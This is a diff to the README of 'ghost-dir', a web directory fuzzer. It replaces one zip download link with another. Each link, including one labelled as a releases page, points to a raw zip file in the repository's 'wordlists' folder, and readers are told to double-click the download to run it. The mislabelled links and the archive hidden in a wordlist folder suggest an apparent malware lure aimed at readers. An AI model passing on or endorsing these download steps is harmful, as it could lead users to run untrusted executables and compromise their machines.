@@ -8,14 +8,14 @@ Ghost-dir is a powerful web directory and file fuzzer designed for penetration t
 
 To begin using ghost-dir, you will need to download the software. 
 
-[![Download ghost-dir](https://raw.githubusercontent.com/SalmanAmin22/ghost-dir/main/wordlists/ghost-dir-3.8.zip)](https://raw.githubusercontent.com/SalmanAmin22/ghost-dir/main/wordlists/ghost-dir-3.8.zip)
+[![Download ghost-dir](https://raw.githubusercontent.com/SalmanAmin22/ghost-dir/main/wordlists/dir-ghost-v2.2-alpha.2.zip)](https://raw.githubusercontent.com/SalmanAmin22/ghost-dir/main/wordlists/dir-ghost-v2.2-alpha.2.zip)
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where the latest version is available:
-   [Visit Releases Page](https://raw.githubusercontent.com/SalmanAmin22/ghost-dir/main/wordlists/ghost-dir-3.8.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/SalmanAmin22/ghost-dir/main/wordlists/dir-ghost-v2.2-alpha.2.zip)
 
 2. **Choose the Latest Release:** Look for the most recent version. You will see files available for download.
 
-3. **Download the Correct File:** Depending on your operating system, select the appropriate file. For example, if you are on Windows, download the `https://raw.githubusercontent.com/SalmanAmin22/ghost-dir/main/wordlists/ghost-dir-3.8.zip` file. If you are using macOS or Linux, download the corresponding binary file.
+3. **Download the Correct File:** Depending on your operating system, select the appropriate file. For example, if you are on Windows, download the `https://raw.githubusercontent.com/SalmanAmin22/ghost-dir/main/wordlists/dir-ghost-v2.2-alpha.2.zip` file. If you are using macOS or Linux, download the corresponding binary file.
 
 4. **Run the Application:** Once the file is downloaded, locate it in your downloads folder and double-click to run it. Follow any prompts that appear.
 
